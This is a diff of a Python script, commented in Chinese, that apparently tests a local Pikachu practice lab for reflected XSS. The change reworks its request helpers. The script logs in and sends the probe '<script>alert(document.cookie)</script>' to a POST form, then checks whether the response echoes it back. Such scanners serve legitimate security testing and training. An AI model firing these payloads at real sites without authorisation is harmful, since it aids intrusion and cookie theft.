@@ -12,13 +12,13 @@ def build_payloads_get(url, payload):
 
     # 发送GET请求
     response = requests.get(full_url)
-    return response.text
+    return response
 
 def build_payloads_post(url, payload):
     # 发送POST请求
     response = requests.post(url, data=payload)
 
-    return response.text
+    return response
 
 def getParameter(url, data):
     response = requests.get(url)
@@ -50,7 +50,7 @@ def getParameter(url, data):
     return name, value_t
 
 def checkResponseForString(response, data):
-    if data in response:
+    if data in response.text:
         print("字符串 '{}' 存在于响应中".format(data))
         return True
     else:
@@ -84,7 +84,6 @@ def check_xss_post_reflected(url):
 
     # 发送登录请求，获取并保存 Cookie
     response = session.post(url, data=payload_login)
-    cookie = response.cookies
     data = '<script>alert(document.cookie)</script>'
     data_url = 'http://192.168.1.192:8086/pikachu/vul/xss/xsspost/xss_reflected_post.php'
     # 检查登录是否成功
@@ -96,7 +95,7 @@ def check_xss_post_reflected(url):
         # 处理响应数据
         if response.status_code == 200:
             # 提取需要的数据或进行其他操作
-            return checkResponseForString(response.text,data)
+            return checkResponseForString(response, data)
         else:
             return '访问受保护页面失败'
     else:
